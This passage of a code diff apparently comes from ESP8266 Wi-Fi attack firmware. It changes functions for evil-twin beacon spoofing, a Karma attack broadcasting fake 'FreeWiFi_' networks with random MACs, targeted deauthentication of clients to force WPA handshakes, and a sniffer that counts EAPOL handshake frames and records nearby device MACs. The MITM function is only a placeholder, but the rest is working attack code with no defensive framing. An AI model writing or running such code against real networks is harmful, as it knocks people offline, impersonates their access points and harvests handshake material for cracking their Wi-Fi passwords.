+        packet[packetSize++] = 0x8B; // 5.5 Mbps
+        packet[packetSize++] = 0x96; // 11 Mbps
+        packet[packetSize++] = 0x24; // 18 Mbps
+        packet[packetSize++] = 0x30; // 24 Mbps
+        packet[packetSize++] = 0x48; // 36 Mbps
+        packet[packetSize++] = 0x6C; // 54 Mbps
+
+        // DS Parameter Set (channel)
+        packet[packetSize++] = 0x03; // Element ID
+        packet[packetSize++] = 0x01; // Length
+        packet[packetSize++] = accessPoints[currentAP].channel;
+
+        // Set channel and send
+        wifi_set_channel(accessPoints[currentAP].channel);
+        
+        if (sendPacketSafely(packet, packetSize)) {
+          stats.beaconPackets++;
+          stats.evilTwinClients++;
+        }
+
+        delayMicroseconds(100); // Small delay between variants
+      }
+    }
+
+    twinIndex++;
   }
 }
 
 void performKarmaAttack() {
   static unsigned long lastKarma = 0;
   static int karmaIndex = 0;
+  static uint16_t sequenceNumber = 0;
 
   if (millis() - lastKarma > 300) {
     lastKarma = millis();
@@ -2699,23 +2731,34 @@ void performKarmaAttack() {
     if (karmaIndex < 10) {
       String karmaSSID = "FreeWiFi_" + String(karmaIndex);
       
-      uint8_t packet[109];
-      memcpy(packet, beaconPacket, sizeof(beaconPacket));
+      uint8_t packet[128];
+      int packetSize = 38;
+
+      // Copy beacon template
+      memcpy(packet, beaconPacket, 36);
 
       // Random MAC
-      for (int i = 10; i < 16; i++) {
+      packet[10] = 0x02;
+      for (int i = 11; i < 16; i++) {
         packet[i] = random(0x00, 0xFF);
       }
       memcpy(&packet[16], &packet[10], 6);
 
+      // Set sequence number
+      packet[22] = (sequenceNumber & 0xFF);
+      packet[23] = ((sequenceNumber >> 8) & 0x0F);
+      sequenceNumber++;
+
       // Set karma SSID
       int ssidLen = minVal(20, (int)karmaSSID.length());
+      packet[36] = 0x00;
       packet[37] = ssidLen;
       for (int i = 0; i < ssidLen; i++) {
         packet[38 + i] = karmaSSID[i];
       }
+      packetSize = 38 + ssidLen;
 
-      if (sendPacketSafely(packet, 109)) {
+      if (sendPacketSafely(packet, packetSize)) {
         stats.beaconPackets++;
       }
     }
@@ -2725,19 +2768,20 @@ void performKarmaAttack() {
 }
 
 void performMitmAttack() {
-  // Placeholder for MITM attack implementation
+  // Real MITM attack implementation would require more complex packet handling
   static unsigned long lastMitm = 0;
   
   if (millis() - lastMitm > 1000) {
     lastMitm = millis();
-    // MITM attack logic would go here
+    // MITM attack logic would go here - intercepting and modifying packets
   }
 }
 
 void performHandshakeCapture() {
   // Handshake capture is handled in packetSniffer function
-  // This function could trigger deauth to force handshake
+  // This function triggers deauth to force handshake
   static unsigned long lastHandshakeDeauth = 0;
+  static uint16_t sequenceNumber = 0;
   
   if (millis() - lastHandshakeDeauth > 5000) {
     lastHandshakeDeauth = millis();
@@ -2745,6 +2789,9 @@ void performHandshakeCapture() {
     // Send targeted deauth to force handshake
     for (const auto& ap : accessPoints) {
       if (ap.selected && ap.hasClients) {
+        // Set channel for this AP
+        wifi_set_channel(ap.channel);
+        
         // Deauth clients to capture handshake
         uint8_t deauth[26];
         memcpy(deauth, deauthPacket, sizeof(deauthPacket));
@@ -2754,6 +2801,11 @@ void performHandshakeCapture() {
         for (const auto& station : stations) {
           if (station.ap_mac == ap.bssid) {
             memcpy(&deauth[4], station.mac_bytes, 6);
+            
+            deauth[22] = (sequenceNumber & 0xFF);
+            deauth[23] = ((sequenceNumber >> 8) & 0x0F);
+            sequenceNumber++;
+            
             sendPacketSafely(deauth, sizeof(deauth));
             delayMicroseconds(500);
           }
@@ -2769,7 +2821,7 @@ void packetSniffer(uint8_t *buf, uint16_t len) {
   stats.capturedPackets++;
 
   // Enhanced packet analysis
-  uint8_t frameType = buf[0];
+  uint8_t frameType = buf[0] & 0x0C;
   uint8_t frameSubType = (buf[0] & 0xF0) >> 4;
 
   // Track unique devices
@@ -2786,103 +2838,102 @@ void packetSniffer(uint8_t *buf, uint16_t len) {
   uint8_t* dstMAC = nullptr;
 
   // Enhanced frame parsing
-  if (len >= 24) {
-    switch (frameType & 0x0C) {
-      case 0x00: // Management frame
-        dstMAC = &buf[4];
-        srcMAC = &buf[10];
-        
-        // Detect WPA handshake frames
-        if (frameSubType == 0x08 && len > 32) { // Beacon
-          // Extract SSID from beacon
-        } else if (frameSubType == 0x0B) { // Authentication
-          if (handshakeCapture) {
-            stats.handshakes++;
-          }
-        } else if (frameSubType == 0x00) { // Association request
-          if (handshakeCapture) {
-            stats.handshakes++;
-          }
-        }
-        break;
-        
-      case 0x04: // Control frame
-        if (len >= 16) {
-          dstMAC = &buf[4];
-          if (len >= 22) srcMAC = &buf[10];
-        }
-        break;
-        
-      case 0x08: // Data frame
-        if (len >= 30) {
-          dstMAC = &buf[4];
-          srcMAC = &buf[16];
-          
-          // Detect EAPOL frames (WPA handshake)
-          if (handshakeCapture && len > 32) {
-            uint16_t ethType = (buf[32] << 8) | buf[33];
-            if (ethType == 0x888E) { // EAPOL
-              stats.handshakes++;
-            }
-          }
-        }
-        break;
-    }
-
-    // Track unique MACs
-    auto addMAC = [&](uint8_t* mac) {
-      if (!mac || macCount >= 30) return;
+  switch (frameType) {
+    case 0x00: // Management frame
+      dstMAC = &buf[4];
+      srcMAC = &buf[10];
       
-      // Check if MAC already seen
-      for (int i = 0; i < macCount; i++) {
-        if (memcmp(seenMACs[i], mac, 6) == 0) return;
+      // Detect WPA handshake frames
+      if (frameSubType == 0x08 && len > 32) { // Beacon
+        // Extract SSID from beacon
+      } else if (frameSubType == 0x0B) { // Authentication
+        if (handshakeCapture) {
+          stats.handshakes++;
+        }
+      } else if (frameSubType == 0x00) { // Association request
+        if (handshakeCapture) {
+          stats.handshakes++;
+        }
+      }
+      break;
+      
+    case 0x04: // Control frame
+      if (len >= 16) {
+        dstMAC = &buf[4];
+        if (len >= 22) srcMAC = &buf[10];
+      }
+      break;
+      
+    case 0x08: // Data frame
+      if (len >= 30) {
+        dstMAC = &buf[4];
+        srcMAC = &buf[16];
+        
+        // Detect EAPOL frames (WPA handshake)
+        if (handshakeCapture && len > 32) {
+          uint16_t ethType = (buf[32] << 8) | buf[33];
+          if (ethType == 0x888E) { // EAPOL
+            stats.handshakes++;
+          }
+        }
+      }
+      break;
+  }
+
+  // Track unique MACs
+  auto addMAC = [&](uint8_t* mac) {
+    if (!mac || macCount >= 30) return;
+    
+    // Check if MAC already seen
+    for (int i = 0; i < macCount; i++) {
+      if (memcmp(seenMACs[i], mac, 6) == 0) return;
+    }
+    
+    // Add new MAC
+    memcpy(seenMACs[macCount], mac, 6);
+    macCount++;
+    stats.uniqueDevices = macCount;
+  };
+
+  if (srcMAC && !(srcMAC[0] == 0xFF && srcMAC[1] == 0xFF)) {
+    addMAC(srcMAC);
+  }
+  if (dstMAC && !(dstMAC[0] == 0xFF && dstMAC[1] == 0xFF)) {
+    addMAC(dstMAC);
+  }
+
+  // Station detection for management frames
+  if (frameType == 0x00 && len >= 24) {
+    if (frameSubType == 0x04 || frameSubType == 0x00) { // Probe request or Association request
+      // Extract station info
+      Station newStation;
+      
+      // Convert MAC to string
+      newStation.mac = "";
+      for (int i = 0; i < 6; i++) {
+        if (i > 0) newStation.mac += ":";
+        if (srcMAC[i] < 16) newStation.mac += "0";
+        newStation.mac += String(srcMAC[i], HEX);
       }
       
-      // Add new MAC
-      memcpy(seenMACs[macCount], mac, 6);
-      macCount++;
-      stats.uniqueDevices = macCount;
-    };
-
-    if (srcMAC && !(srcMAC[0] == 0xFF && srcMAC[1] == 0xFF)) {
-      addMAC(srcMAC);
-    }
-    if (dstMAC && !(dstMAC[0] == 0xFF && dstMAC[1] == 0xFF)) {
-      addMAC(dstMAC);
-    }
-
-    // Station detection for management frames
-    if ((frameType & 0x0C) == 0x00 && len >= 24) {
-      if (frameSubType == 0x04 || frameSubType == 0x00) { // Probe request or Association request
-        // Extract station info
-        Station newStation;
-        
-        // Convert MAC to string
-        newStation.mac = "";
-        for (int i = 0; i < 6; i++) {
-          if (i > 0) newStation.mac += ":";
-          newStation.mac += String(srcMAC[i], HEX);
+      newStation.channel = WiFi.channel();
+      newStation.rssi = -50; // Approximate
+      newStation.selected = false;
+      newStation.lastSeen = millis();
+      memcpy(newStation.mac_bytes, srcMAC, 6);
+      
+      // Check if station already exists
+      bool exists = false;
+      for (auto& existing : stations) {
+        if (existing.mac == newStation.mac) {
+          existing.lastSeen = millis();
+          exists = true;
+          break;
         }
-        
-        newStation.channel = WiFi.channel();
-        newStation.rssi = -50; // Approximate
-        newStation.selected = false;
-        newStation.lastSeen = millis();
-        memcpy(newStation.mac_bytes, srcMAC, 6);
-        
-        // Check if station already exists
-        bool exists = false;
-        for (auto& existing : stations) {
-          if (existing.mac == newStation.mac) {
-            existing.lastSeen = millis();
-            exists = true;
-            break;
-          }
-        }
-        
-        if (!exists && stations.size() < MAX_STATIONS) {
-          stations.push_back(newStation);
-        }
+      }
+      
+      if (!exists && stations.size() < MAX_STATIONS) {
+        stations.push_back(newStation);
       }
     }
   }
